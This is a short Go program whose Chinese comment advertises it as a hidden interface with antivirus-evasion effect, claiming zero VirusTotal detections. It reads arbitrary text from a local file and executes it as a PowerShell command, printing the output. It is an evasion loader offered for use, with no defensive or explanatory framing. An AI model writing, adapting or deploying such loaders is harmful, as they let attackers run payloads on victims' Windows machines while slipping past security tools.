package main

// 隐藏接口, 免杀效果 (VT-0)

import (
	"os/exec"
	"io/ioutil"
	"log"
	"fmt"
)


func main(){
	str, err := ioutil.ReadFile("./test1.txt")
	if err != nil {
		log.Fatal(err)
	}
	comd := string(str)
	fmt.Printf("comd: %s\n", comd)
	cmd := exec.Command("powershell", "/c", comd)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("error combined out:n%s\n", string(out))
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	output := string(out)
	fmt.Print(output)

}
